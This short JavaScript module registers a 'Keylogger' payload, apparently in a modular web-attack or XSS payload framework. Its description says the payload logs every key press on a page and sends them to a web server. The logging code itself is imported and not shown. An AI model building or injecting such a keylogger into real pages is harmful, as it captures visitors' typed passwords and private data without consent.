import { cook, render, validate, init } from './Keylogger'

export default {
  title: 'Keylogger',
  description: 'Log all key presses on the page and submit them back to a web server',
  cook: cook,
  render: render,
  validate: validate,
  init: init,
  dependencies: ['AjaxRequest']
}
